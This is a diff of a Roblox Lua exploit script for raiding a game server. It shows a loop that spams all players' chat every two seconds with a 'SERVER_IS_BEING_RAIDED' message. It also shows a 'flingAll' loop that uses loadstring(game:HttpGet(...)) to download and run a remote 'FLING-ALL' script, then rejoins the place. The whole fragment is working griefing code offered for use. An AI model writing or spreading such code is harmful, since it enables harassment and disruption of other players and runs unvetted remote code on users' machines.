@@ -446,7 +446,7 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local function spamChat()
-    local message = V
+    local message = "_____________________________________________________________________________________________________________________________________________________________________________SERVER_IS_BEING_RAIDED"
     while true do
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
         wait(2)
@@ -455,7 +455,7 @@ end
 
 local function flingAll()
     while true do
-        loadstring(game:HttpGet("https://raw .githubusercontent.com/GTAFAW/goto/refs/heads/main/1111"))()
+        loadstring(game:HttpGet(" https://raw scripts . net/raw/Universal-Script-FLING-ALL-Script-17590 "))()
         wait(3)
         TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
     end
